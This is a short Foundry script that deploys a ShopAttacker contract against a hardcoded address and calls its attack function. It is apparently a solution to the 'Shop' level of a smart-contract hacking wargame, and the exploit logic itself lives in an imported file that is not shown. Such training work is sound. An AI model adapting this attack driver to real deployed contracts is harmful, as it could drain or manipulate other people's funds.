// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../levels/21-Shop.sol";
import "../src/21-Shop.sol";
import "forge-std/Script.sol";

contract Attack is Script {
    function run() external{
        vm.startBroadcast();

        // Create attacker contract
        ShopAttacker shopAttacker = new ShopAttacker(0x1b810452a9Eef45eEc6029dBF1b66E5a91339286);

        // Attack shop
        shopAttacker.attack();

        vm.stopBroadcast();
    }
}